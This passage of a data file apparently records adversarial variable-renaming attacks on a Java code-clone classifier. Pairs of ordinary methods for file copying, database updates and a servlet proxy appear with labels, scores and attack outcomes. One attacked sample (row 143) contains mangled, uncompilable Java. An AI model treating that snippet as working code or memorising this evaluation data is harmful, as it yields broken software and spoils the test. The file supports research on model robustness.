            if (response >= 400) {
                return new DefaultFileAttribute(false, 0, null, FileType.NOT_EXISTS);
            }
            boolean redirect = (response >= 300 && response <= 399);
            if (redirect) {
                String location = con.getHeaderField(""Location"");
                return getAttribute(new URL(url, location));
            }
            return new DefaultFileAttribute(true, con.getContentLength(), new Date(con.getLastModified()), url.toString().endsWith(""/"") ? FileType.DIRECTORY : FileType.FILE);
        } catch (MalformedURLException e) {
            e.printStackTrace();
            throw new WrongPathException(file.getAbsolutePath());
        } catch (IOException e) {
            throw new VFSIOException(""IOException opening "" + file.getAbsolutePath(), e);
        } finally {
            if (con != null) {
                con.disconnect();
            }
        }
    }
",277,,LABEL_0,LABEL_0,LABEL_0,-1,"loadDDL,stmt,qry,q",,,,0,,0,GA,1536,0.5737293720245361,failed,[]
135,"    private void handleNodeLostService(long eventID, long nodeID, String ipAddr, long serviceID, String eventTime) {
        Category log = ThreadCategory.getInstance(OutageWriter.class);
        if (eventID == -1 || nodeID == -1 || ipAddr == null || serviceID == -1) {
            log.warn(EventConstants.NODE_REGAINED_SERVICE_EVENT_UEI + "" ignored - info incomplete - eventid/nodeid/ip/svc: "" + eventID + ""/"" + nodeID + ""/"" + ipAddr + ""/"" + serviceID);
            return;
        }
        Connection dbConn = null;
        try {
            dbConn = DatabaseConnectionFactory.getInstance().getConnection();
            if (openOutageExists(dbConn, nodeID, ipAddr, serviceID)) {
                log.warn(""\'"" + EventConstants.NODE_LOST_SERVICE_EVENT_UEI + ""\' for "" + nodeID + ""/"" + ipAddr + ""/"" + serviceID + "" ignored - table already  has an open record "");
            } else {
                PreparedStatement getNextOutageIdStmt = dbConn.prepareStatement(OutageManagerConfigFactory.getInstance().getGetNextOutageID());
                long outageID = -1;
                ResultSet seqRS = getNextOutageIdStmt.executeQuery();
                if (seqRS.next()) {
                    outageID = seqRS.getLong(1);
                }
                seqRS.close();
                try {
                    dbConn.setAutoCommit(false);
                } catch (SQLException sqle) {
                    log.error(""Unable to change database AutoCommit to FALSE"", sqle);
                    return;
                }
                PreparedStatement newOutageWriter = null;
                if (log.isDebugEnabled()) log.debug(""handleNodeLostService: creating new outage entry..."");
                newOutageWriter = dbConn.prepareStatement(OutageConstants.DB_INS_NEW_OUTAGE);
                newOutageWriter.setLong(1, outageID);
                newOutageWriter.setLong(2, eventID);
                newOutageWriter.setLong(3, nodeID);
                newOutageWriter.setString(4, ipAddr);
                newOutageWriter.setLong(5, serviceID);
                newOutageWriter.setTimestamp(6, convertEventTimeIntoTimestamp(eventTime));
                newOutageWriter.executeUpdate();
                newOutageWriter.close();
                try {
                    dbConn.commit();
                    if (log.isDebugEnabled()) log.debug(""nodeLostService : "" + nodeID + ""/"" + ipAddr + ""/"" + serviceID + "" recorded in DB"");
                } catch (SQLException se) {
                    log.warn(""Rolling back transaction, nodeLostService could not be recorded  for nodeid/ipAddr/service: "" + nodeID + ""/"" + ipAddr + ""/"" + serviceID, se);
                    try {
                        dbConn.rollback();
                    } catch (SQLException sqle) {
                        log.warn(""SQL exception during rollback, reason"", sqle);
                    }
                }
            }
        } catch (SQLException sqle) {
            log.warn(""SQL exception while handling \'nodeLostService\'"", sqle);
        } finally {
            try {
                if (dbConn != null) dbConn.close();
            } catch (SQLException e) {
                log.warn(""Exception closing JDBC connection"", e);
            }
        }
    }
 <SPLIT>     public static void addRecipe(String name, String instructions, int categoryId, String[][] ainekset) throws Exception {
        PreparedStatement pst1 = null;
        PreparedStatement pst2 = null;
        ResultSet rs = null;
        int retVal = -1;
        try {
            pst1 = conn.prepareStatement(""INSERT INTO recipes (name, instructions, category_id) VALUES (?, ?, ?)"");
            pst1.setString(1, name);
            pst1.setString(2, instructions);
            pst1.setInt(3, categoryId);
            if (pst1.executeUpdate() > 0) {
                pst2 = conn.prepareStatement(""SELECT recipe_id FROM recipes WHERE name = ? AND instructions = ? AND category_id = ?"");
                pst2.setString(1, name);
                pst2.setString(2, instructions);
                pst2.setInt(3, categoryId);
                rs = pst2.executeQuery();
                if (rs.next()) {
                    int id = rs.getInt(1);
                    System.out.println(""Lis�t��n ainesosat"");
                    String[] aines;
                    for (int i = 0; i < ainekset.length; ++i) {
                        aines = ainekset[i];
                        addIngredient(id, aines[0], aines[1], Integer.parseInt(aines[2]), Integer.parseInt(aines[3]));
                    }
                    retVal = id;
                } else {
                    retVal = -1;
                }
            } else {
                retVal = -1;
            }
            conn.commit();
        } catch (Exception e) {
            conn.rollback();
            throw new Exception(""Reseptin lis�ys ep�onnistui. Poikkeus: "" + e.getMessage());
        }
    }
",516,,LABEL_1,LABEL_0,,-4,"handleNodeLostService,eventID,nodeID,ipAddr,serviceID,eventTime,log,dbConn,getNextOutageIdStmt,outageID,seqRS,newOutageWriter",,,,0,,0,Greedy,1,0.0008310914039611816,,[]
136,"    private void loadDDL() throws IOException {
        try {
            conn.createStatement().executeQuery(""SELECT * FROM overrides"").close();
        } catch (SQLException e) {
            Statement stmt = null;
            if (!e.getMessage().startsWith(ERR_MISSING_TABLE)) {
                LOG.fatal(SQL_ERROR, e);
                throw new IOException(""Error on initial data store read"", e);
            }
            String[] qry = { ""CREATE TABLE monitor (id INTEGER PRIMARY KEY NOT NULL, status VARCHAR(32) NOT NULL, next_update TIMESTAMP NOT NULL)"", ""CREATE TABLE overrides (id INT NOT NULL, title VARCHAR(255) NOT NULL, subtitle VARCHAR(255) NOT NULL, enable BOOLEAN NOT NULL DEFAULT TRUE, PRIMARY KEY(id))"", ""CREATE TABLE settings (var VARCHAR(32) NOT NULL, val VARCHAR(255) NOT NULL, PRIMARY KEY(var))"", ""INSERT INTO settings (var, val) VALUES ('schema', '1')"" };
            try {
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                for (String q : qry) stmt.executeUpdate(q);
                conn.commit();
            } catch (SQLException e2) {
                try {
                    conn.rollback();
                } catch (SQLException e3) {
                    LOG.fatal(SQL_ERROR, e3);
                }
                LOG.fatal(SQL_ERROR, e2);
                throw new IOException(""Error initializing data store"", e2);
            } finally {
                if (stmt != null) {
                    try {
                        stmt.close();
                    } catch (SQLException e4) {
                        LOG.fatal(SQL_ERROR, e4);
                        throw new IOException(""Unable to cleanup data store resources"", e4);
                    }
                }
                try {
                    conn.setAutoCommit(true);
                } catch (SQLException e3) {
                    LOG.fatal(SQL_ERROR, e3);
                    throw new IOException(""Unable to reset data store auto commit"", e3);
                }
            }
        }
        return;
    }
 <SPLIT>     public static Body decodeBody(InputStream in, String contentTransferEncoding) throws IOException {
        if (contentTransferEncoding != null) {
            contentTransferEncoding = MimeUtility.getHeaderParameter(contentTransferEncoding, null);
            if (""quoted-printable"".equalsIgnoreCase(contentTransferEncoding)) {
                in = new QuotedPrintableInputStream(in);
            } else if (""base64"".equalsIgnoreCase(contentTransferEncoding)) {
                in = new Base64InputStream(in);
            }
        }
        BinaryTempFileBody tempBody = new BinaryTempFileBody();
        OutputStream out = tempBody.getOutputStream();
        IOUtils.copy(in, out);
        out.close();
        return tempBody;
    }
",277,,LABEL_0,LABEL_0,LABEL_0,-1,"loadDDL,stmt,qry,q",,,,0,,0,GA,1516,0.5609541535377502,failed,[]
137,"    private static long copy(InputStream source, OutputStream sink) {
        try {
            return IOUtils.copyLarge(source, sink);
        } catch (IOException e) {
            logger.error(e.toString(), e);
            throw new FaultException(""System error copying stream"", e);
        } finally {
            IOUtils.closeQuietly(source);
            IOUtils.closeQuietly(sink);
        }
    }
 <SPLIT>     private void tail(String[] cmd, int pos) throws IOException {
        CommandFormat c = new CommandFormat(""tail"", 1, 1, ""f"");
        String src = null;
        Path path = null;
        try {
            List<String> parameters = c.parse(cmd, pos);
            src = parameters.get(0);
        } catch (IllegalArgumentException iae) {
            System.err.println(""Usage: java FsShell "" + TAIL_USAGE);
            throw iae;
        }
        boolean foption = c.getOpt(""f"") ? true : false;
        path = new Path(src);
        FileSystem srcFs = path.getFileSystem(getConf());
        if (srcFs.isDirectory(path)) {
            throw new IOException(""Source must be a file."");
        }
        long fileSize = srcFs.getFileStatus(path).getLen();
        long offset = (fileSize > 1024) ? fileSize - 1024 : 0;
        while (true) {
            FSDataInputStream in = srcFs.open(path);
            in.seek(offset);
            IOUtils.copyBytes(in, System.out, 1024, false);
            offset = in.getPos();
            in.close();
            if (!foption) {
                break;
            }
            fileSize = srcFs.getFileStatus(path).getLen();
            offset = (fileSize > offset) ? offset : fileSize;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
",75,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,source,sink",,,,0,,0,GA,837,0.30436393022537234,failed,[]
138,"    public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
 <SPLIT>     private void streamContains(String in, InputStream stream) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        IOUtils.copy(stream, baos);
        byte[] bytes = baos.toByteArray();
        String cmp = new String(bytes, ""UTF-8"");
        assertTrue(cmp.contains(in));
        baos.close();
    }
",291,,LABEL_1,LABEL_1,LABEL_1,-1,"testReadHelloWorldTxt,helloWorldIS,helloWorldPath,fileOutputStream,contentResolver,content",,,,0,,0,GA,1917,0.709500233332316,failed,[]
139,"    @Override
    public Resource createNew(String name, InputStream in, Long length, String contentType) throws IOException {
        File dest = new File(this.realFile, name);
        if (allowedClient) {
            if ("".request"".equals(name) || "".tokens"".equals(name)) {
                FileOutputStream out = null;
                try {
                    out = new FileOutputStream(dest);
                    IOUtils.copy(in, out);
                } finally {
                    IOUtils.closeQuietly(out);
                }
                if ("".request"".equals(name)) {
                    File request = new File(realFile.getAbsolutePath() + ""/"" + name);
                    RequestManager.manageRequest(request, null, true);
                    return new OverEncryptedFriendsFile(factory, folderPath + ""/.response"", allowedClient);
                }
                return new OverEncryptedFriendsFile(factory, folderPath + ""/"" + name, allowedClient);
            } else {
                return null;
            }
        } else {
            LOGGER.error(""User isn't owner of this folder"");
            return null;
        }
    }
 <SPLIT>     private static void copy(String sourceName, String destName) throws IOException {
        File source = new File(sourceName);
        File dest = new File(destName);
        FileChannel in = null, out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(dest).getChannel();
            long size = in.size();
            MappedByteBuffer buf = in.map(FileChannel.MapMode.READ_ONLY, 0, size);
            out.write(buf);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
",195,,LABEL_1,LABEL_1,LABEL_1,-1,"createNew,name,in,length,contentType,dest,out,request",,,,0,,0,GA,2965,1.0642356634140016,failed,[]
140,"    public void serialize(OutputStream out) throws IOException, BadIMSCPException {
        ensureParsed();
        ZipFilePackageParser parser = utils.getIMSCPParserFactory().createParser();
        parser.setContentPackage(cp);
        if (on_disk != null) on_disk.delete();
        on_disk = createTemporaryFile();
        parser.serialize(on_disk);
        InputStream in = new FileInputStream(on_disk);
        IOUtils.copy(in, out);
    }
 <SPLIT>     private static void doCopyFile(File srcFile, File destFile, boolean preserveFileDate) throws IOException {
        if (destFile.exists() && destFile.isDirectory()) {
            throw new IOException(""Destination '"" + destFile + ""' exists but is a directory"");
        }
        FileChannel input = new FileInputStream(srcFile).getChannel();
        try {
            FileChannel output = new FileOutputStream(destFile).getChannel();
            try {
                output.transferFrom(input, 0, input.size());
            } finally {
                IOUtil.closeQuietly(output);
            }
        } finally {
            IOUtil.closeQuietly(input);
        }
        if (srcFile.length() != destFile.length()) {
            throw new IOException(""Failed to copy full contents from '"" + srcFile + ""' to '"" + destFile + ""'"");
        }
        if (preserveFileDate) {
            destFile.setLastModified(srcFile.lastModified());
        }
    }
",81,,LABEL_1,LABEL_1,LABEL_1,-1,"serialize,out,parser,on_disk,in",,,,0,,0,GA,1756,0.6254810492197672,failed,[]
141,"    public static void main(String[] args) {
        File srcDir = new File(args[0]);
        File dstDir = new File(args[1]);
        File[] srcFiles = srcDir.listFiles();
        for (File f : srcFiles) {
            if (f.isDirectory()) continue;
            try {
                FileChannel srcChannel = new FileInputStream(f).getChannel();
                FileChannel dstChannel = new FileOutputStream(dstDir.getAbsolutePath() + System.getProperty(""file.separator"") + f.getName()).getChannel();
                ByteBuffer buffer = ByteBuffer.allocate(1024);
                int nr = 0;
                srcChannel.position(nr);
                nr += srcChannel.read(buffer);
                while (nr < f.length()) {
                    buffer.flip();
                    dstChannel.write(buffer);
                    buffer.clear();
                    nr += srcChannel.read(buffer);
                }
                srcChannel.close();
                dstChannel.close();
            } catch (IOException e) {
            }
        }
    }
 <SPLIT>     public Configuration(URL url) {
        InputStream in = null;
        try {
            load(in = url.openStream());
        } catch (Exception e) {
            throw new RuntimeException(""Could not load configuration from "" + url, e);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException ignore) {
                }
            }
        }
    }
",205,,LABEL_0,LABEL_0,LABEL_0,-1,"srcDir,dstDir,srcFiles,f,srcChannel,dstChannel,buffer,nr",,,,0,,0,GA,3009,1.077039376894633,failed,[]
142,"    protected int deleteBitstreamInfo(int id, Connection conn) {
        PreparedStatement stmt = null;
        int numDeleted = 0;
        try {
            stmt = conn.prepareStatement(DELETE_BITSTREAM_INFO);
            stmt.setInt(1, id);
            numDeleted = stmt.executeUpdate();
            if (numDeleted > 1) {
                conn.rollback();
                throw new IllegalStateException(""Too many rows deleted! Number of rows deleted: "" + numDeleted + "" only one row should be deleted for bitstream id "" + id);
            }
        } catch (SQLException e) {
            LOG.error(""Problem deleting bitstream. "" + e.getMessage(), e);
            throw new RuntimeException(""Problem deleting bitstream. "" + e.getMessage(), e);
        } finally {
            cleanup(stmt);
        }
        return numDeleted;
    }
 <SPLIT>     public void doUpdateByLoginID() throws Exception {
        if (!isValidate()) {
            throw new CesSystemException(""User_session.doUpdateByLoginID(): Illegal data values for update"");
        }
        Connection con = null;
        PreparedStatement ps = null;
        String strQuery = ""UPDATE "" + Common.USER_SESSION_TABLE + "" SET "" + ""session_id = ?, user_id = ?, begin_date = ? , "" + ""ip_address = ?, mac_no = ? "" + ""WHERE  login_id= ?"";
        DBOperation dbo = factory.createDBOperation(POOL_NAME);
        try {
            con = dbo.getConnection();
            con.setAutoCommit(false);
            ps = con.prepareStatement(strQuery);
            ps.setString(1, this.sessionID);
            ps.setInt(2, this.user.getUserID());
            ps.setTimestamp(3, this.beginDate);
            ps.setString(4, this.ipAddress);
            ps.setString(5, this.macNO);
            ps.setString(6, this.loginID);
            int resultCount = ps.executeUpdate();
            if (resultCount != 1) {
                con.rollback();
                throw new CesSystemException(""User_session.doUpdateByLoginID(): ERROR updating data in T_SYS_USER_SESSION!! "" + ""resultCount = "" + resultCount);
            }
            con.commit();
        } catch (SQLException se) {
            if (con != null) {
                con.rollback();
            }
            throw new CesSystemException(""User_session.doUpdateByLoginID(): SQLException while updating user_session; "" + ""session_id = "" + this.sessionID + "" :\n\t"" + se);
        } finally {
            con.setAutoCommit(true);
            closePreparedStatement(ps);
            closeConnection(dbo);
        }
    }
",135,,LABEL_1,LABEL_1,LABEL_1,-1,"deleteBitstreamInfo,id,conn,stmt,numDeleted",,,,0,,0,GA,1909,0.6957258621851603,failed,[]
143,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenQueryString = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQueryString);
        URL rewrittenUrl = new URL(fedoraUrl + rewrittenQueryString);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection httpURLConnection = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        httpURLConnection.connect();
        response.setStatus(httpURLConnection.getResponseCode());
        logger.debug(""[status="" + httpURLConnection.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<String>> header : httpURLConnection.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String value : header.getValue()) {
                    if (value != null) {
                        logger.debug(header.getKey() + "": "" + value);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), value);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStream inputStream = httpURLConnection.getInputStream();
        OutputStream outputStream = response.getOutputStream();
        IOUtils.copy(inputStream, outputStream);
    }
 <SPLIT>     public void buildSiteForEdit(String sBasePath, String sOutputPath, String sCtrlPath, String sMenuPath, String sIntegradorPath, String sSelPageOptions, Properties oEnvironmentProps, Properties oUserProps) throws IOException, DOMException, TransformerException, TransformerConfigurationException, MalformedURLException {
        Transformer oTransformer;
        StreamResult oStreamResult;
        StreamSource oStreamSrcXML;
        StringWriter oStrWritter;
        InputStream oXMLStream = null;
        String sTransformed;
        StringBuffer oPostTransform;
        String sKey;
        String sMedia;
        Object sVal;
        Page oCurrentPage;
        int iCloseHead, iOpenBody, iCloseBody;
        int iReaded;
        char CharBuffer[] = new char[8192];
        String sCharBuffer;
        long lElapsed = 0;
        final String sSep = System.getProperty(""file.separator"");
        if (DebugFile.trace) {
            lElapsed = System.currentTimeMillis();
            DebugFile.writeln(""Begin Pageset.buildSiteForEdit("" + sBasePath + "","" + sOutputPath + "","" + sCtrlPath + "","" + sMenuPath + "")"");
            DebugFile.incIdent();
        }
        FileSystem oFS = new FileSystem();
        Vector vPages = pages();
        if (!sBasePath.endsWith(sSep)) sBasePath += sSep;
        String sWebServer = oEnvironmentProps.getProperty(""webserver"", """");
        if (DebugFile.trace && sWebServer.length() == 0) DebugFile.writeln(""WARNING: webserver property not set at EnvironmentProperties"");
        if (!sWebServer.endsWith(""/"")) sWebServer += ""/"";
        Node oContainers = oMSite.seekChildByName(oMSite.getRootNode().getFirstChild(), ""containers"");
        if (oContainers == null) {
            if (DebugFile.trace) DebugFile.writeln(""ERROR: <containers> node not found."");
            throw new DOMException(DOMException.NOT_FOUND_ERR, ""<containers> node not found"");
        }
        if (DebugFile.trace) DebugFile.writeln(""new FileInputStream("" + (sURI.startsWith(""file://"") ? sURI.substring(7) : sURI) + "")"");
        for (int c = 0; c < vPages.size(); c++) {
            oCurrentPage = (Page) vPages.get(c);
            oXMLStream = new FileInputStream(sURI.startsWith(""file://"") ? sURI.substring(7) : sURI);
            oStreamSrcXML = new StreamSource(oXMLStream);
            oStrWritter = new StringWriter();
            oStreamResult = new StreamResult(oStrWritter);
            try {
                oTransformer = StylesheetCache.newTransformer(sBasePath + ""xslt"" + sSep + ""templates"" + sSep + oMSite.name() + sSep + oCurrentPage.template());
                sMedia = oTransformer.getOutputProperty(OutputKeys.MEDIA_TYPE);
                if (DebugFile.trace) DebugFile.writeln(OutputKeys.MEDIA_TYPE + ""="" + sMedia);
                if (null == sMedia) sMedia = ""html""; else sMedia = sMedia.substring(sMedia.indexOf('/') + 1);
                if (null == oCurrentPage.getTitle()) throw new NullPointerException(""Page "" + String.valueOf(c) + "" title is null"");
                if (DebugFile.trace) DebugFile.writeln(""Page.filePath("" + sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""."" + sMedia + "")"");
                oCurrentPage.filePath(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""."" + sMedia);
                StylesheetCache.setParameters(oTransformer, oEnvironmentProps);
                StylesheetCache.setParameters(oTransformer, oUserProps);
                oTransformer.setParameter(""param_page"", ((Page) (vPages.get(c))).getTitle());
                oTransformer.transform(oStreamSrcXML, oStreamResult);
            } catch (TransformerConfigurationException e) {
                oLastXcpt = e;
                sMedia = null;
                SourceLocator sl = e.getLocator();
                if (DebugFile.trace) {
                    if (sl == null) {
                        DebugFile.writeln(""ERROR TransformerConfigurationException "" + e.getMessage());
                    } else {
                        DebugFile.writeln(""ERROR TransformerConfigurationException "" + e.getMessage() + "" line="" + String.valueOf(sl.getLineNumber()) + "" column="" + String.valueOf(sl.getColumnNumber()));
                    }
                }
            } catch (TransformerException e) {
                oLastXcpt = e;
                sMedia = null;
                if (DebugFile.trace) DebugFile.writeln(""ERROR TransformerException "" + e.getMessageAndLocation());
            }
            oTransformer = null;
            oStreamResult = null;
            sTransformed = oStrWritter.toString();
            if (DebugFile.trace) DebugFile.writeln(""transformation length="" + String.valueOf(sTransformed.length()));
            if (sTransformed.length() > 0) {
                iCloseHead = sTransformed.indexOf(""</head"");
                if (iCloseHead < 0) iCloseHead = sTransformed.indexOf(""</HEAD"");
                iOpenBody = sTransformed.indexOf(""<body"", iCloseHead);
                if (iOpenBody < 0) iOpenBody = sTransformed.indexOf(""<BODY"", iCloseHead);
                iCloseBody = sTransformed.indexOf("">"", iOpenBody + 5);
                for (char s = sTransformed.charAt(iCloseBody + 1); s == '\r' || s == '\n' || s == ' ' || s == '\t'; s = sTransformed.charAt(++iCloseBody)) ;
                oPostTransform = new StringBuffer(sTransformed.length() + 4096);
                oPostTransform.append(sTransformed.substring(0, iCloseHead));
                oPostTransform.append(""\n<script language=\""JavaScript\"" src=\"""" + sMenuPath + ""\""></script>"");
                oPostTransform.append(""\n<script language=\""JavaScript\"" src=\"""" + sIntegradorPath + ""\""></script>\n"");
                oPostTransform.append(sTransformed.substring(iCloseHead, iCloseHead + 7));
                oPostTransform.append(sTransformed.substring(iOpenBody, iCloseBody));
                try {
                    sCharBuffer = oFS.readfilestr(sCtrlPath, ""UTF-8"");
                    if (DebugFile.trace) DebugFile.writeln(String.valueOf(sCharBuffer.length()) + "" characters readed"");
                } catch (com.enterprisedt.net.ftp.FTPException ftpe) {
                    throw new IOException(ftpe.getMessage());
                }
                try {
                    if (DebugFile.trace) DebugFile.writeln(""Gadgets.replace("" + sCtrlPath + "",http://demo.hipergate.com/,"" + sWebServer + "")"");
                    Gadgets.replace(sCharBuffer, ""http://demo.hipergate.com/"", sWebServer);
                } catch (org.apache.oro.text.regex.MalformedPatternException e) {
                }
                oPostTransform.append(""<!--Begin "" + sCtrlPath + ""-->\n"");
                oPostTransform.append(sCharBuffer);
                sCharBuffer = null;
                oPostTransform.append(""\n<!--End "" + sCtrlPath + ""-->\n"");
                oPostTransform.append(sTransformed.substring(iCloseBody));
            } else {
                oPostTransform = new StringBuffer(""Page "" + ((Page) vPages.get(c)).getTitle() + "" could not be rendered."");
                if (oLastXcpt != null) oPostTransform.append(""<BR>"" + oLastXcpt.getMessageAndLocation());
            }
            if (DebugFile.trace) DebugFile.writeln(""new FileWriter("" + sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia + "")"");
            if (sSelPageOptions.length() == 0) oFS.writefilestr(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia, oPostTransform.toString(), ""UTF-8""); else try {
                oFS.writefilestr(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia, Gadgets.replace(oPostTransform.toString(), "":selPageOptions"", sSelPageOptions), ""UTF-8"");
            } catch (Exception e) {
            }
            oPostTransform = null;
            sTransformed = null;
        }
        oXMLStream.close();
        if (DebugFile.trace) {
            DebugFile.writeln(""done in "" + String.valueOf(System.currentTimeMillis() - lElapsed) + "" miliseconds"");
            DebugFile.decIdent();
            DebugFile.writeln(""End Pageset.buildSiteForEdit()"");
        }
    }
",335,"    @Override
    protected void  doget(HttpServletRequest request, HttpServletResponse version) throws ServletException, IOException {
        String rewrittenQuestionLine = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQuestionLine);
        URL rrewrittenUrl= new URL(fedoraUrl + rewrittenQuestionLine);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection httpurlConnect = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        httpurlConnect.connect();
        version.setStatus(httpurlConnect.getResponseCode());
        logger.debug(""[status="" + httpurlConnect.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<Stringheaderder : httpurlConnect.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String letter : header.getValue()) {
                    if (letter != null) {
                        logger.debug(header.getKey() + "": "" + letter);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            version.addHeader(header.getKey(), letter);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStreInputstreameam = httpurlConnect.getInputStream();
        OutputStreamoutputFilem = version.getOutputStream();
        IOUtils.copy(Inputstream, outputFile);
    }
",LABEL_1,LABEL_1,0.5139001607894897,1,"doGet,request,response,rewrittenQueryString,rewrittenUrl,httpURLConnection,header,value,inputStream,outputStream",,,,15,"doGet: doget,request:request,response:version,rewrittenQueryString:rewrittenQuestionLine,rewrittenUrl:rewrittenUrl,httpURLConnection:httpurlConnect,header:header,value:letter,inputStream:Inputstream,outputStream:outputFile,",3,GA,644,0.28316296339035035,ga,[]
144,"    int doOne(int bid, int tid, int aid, int delta) {
        int aBalance = 0;
        if (Conn == null) {
            bench.incrementFailedTransactionCount();
            return 0;
        }
        try {
            if (Benchmark.prepared_stmt) {
                pstmt1.setInt(1, delta);
                pstmt1.setInt(2, aid);
                pstmt1.executeUpdate();
                pstmt1.clearWarnings();
                pstmt2.setInt(1, aid);
                ResultSet RS = pstmt2.executeQuery();
                pstmt2.clearWarnings();
                while (RS.next()) {
                    aBalance = RS.getInt(1);
                }
                pstmt3.setInt(1, delta);
                pstmt3.setInt(2, tid);
                pstmt3.executeUpdate();
                pstmt3.clearWarnings();
                pstmt4.setInt(1, delta);
                pstmt4.setInt(2, bid);
                pstmt4.executeUpdate();
                pstmt4.clearWarnings();
                pstmt5.setInt(1, tid);
                pstmt5.setInt(2, bid);
                pstmt5.setInt(3, aid);
                pstmt5.setInt(4, delta);
                pstmt5.executeUpdate();
                pstmt5.clearWarnings();
            } else {
                Statement Stmt = Conn.createStatement();
                String Query = ""UPDATE accounts"";
                Query += "" SET Abalance = Abalance + "" + delta;
                Query += "" WHERE Aid = "" + aid;
                int res = Stmt.executeUpdate(Query);
                Stmt.clearWarnings();
                Query = ""SELECT Abalance"";
                Query += "" FROM accounts"";
                Query += "" WHERE Aid = "" + aid;
                ResultSet RS = Stmt.executeQuery(Query);
                Stmt.clearWarnings();
                while (RS.next()) {
                    aBalance = RS.getInt(1);
                }
                Query = ""UPDATE tellers"";
                Query += "" SET Tbalance = Tbalance + "" + delta;
                Query += "" WHERE Tid = "" + tid;
                Stmt.executeUpdate(Query);
                Stmt.clearWarnings();
                Query = ""UPDATE branches"";
                Query += "" SET Bbalance = Bbalance + "" + delta;
                Query += "" WHERE Bid = "" + bid;
                Stmt.executeUpdate(Query);
                Stmt.clearWarnings();
                Query = ""INSERT INTO history(Tid, Bid, Aid, delta)"";
                Query += "" VALUES ("";
                Query += tid + "","";
                Query += bid + "","";
                Query += aid + "","";
                Query += delta + "")"";
                Stmt.executeUpdate(Query);
                Stmt.clearWarnings();
                Stmt.close();
            }
            if (Benchmark.transactions) {
                Conn.commit();
            }
            return aBalance;
        } catch (java.lang.Exception e) {
            if (Benchmark.verbose) {
                System.out.println(""Transaction failed: "" + e.getMessage());
                e.printStackTrace();
            }
            bench.incrementFailedTransactionCount();
            if (Benchmark.transactions) {
                try {
                    Conn.rollback();
                } catch (SQLException e1) {
                }
            }
        }
        return 0;
    }
 <SPLIT>     public void savaRolePerm(String roleid, Collection role_perm_collect) throws DAOException, SQLException {
        ConnectionProvider cp = null;
        Connection conn = null;
        ResultSet rs = null;
        PreparedStatement pstmt = null;
        PrivilegeFactory factory = PrivilegeFactory.getInstance();
        Operation op = factory.createOperation();
        try {
            cp = ConnectionProviderFactory.getConnectionProvider(Constants.DATA_SOURCE);
            conn = cp.getConnection();
            try {
                pstmt = conn.prepareStatement(DEL_ROLE_PERM);
                pstmt.setString(1, roleid);
                pstmt.executeUpdate();
            } catch (Exception e) {
            }
            if ((role_perm_collect == null) || (role_perm_collect.size() == 0)) {
                return;
            } else {
                conn.setAutoCommit(false);
                pstmt = conn.prepareStatement(ADD_ROLE_PERM);
                Iterator role_perm_ir = role_perm_collect.iterator();
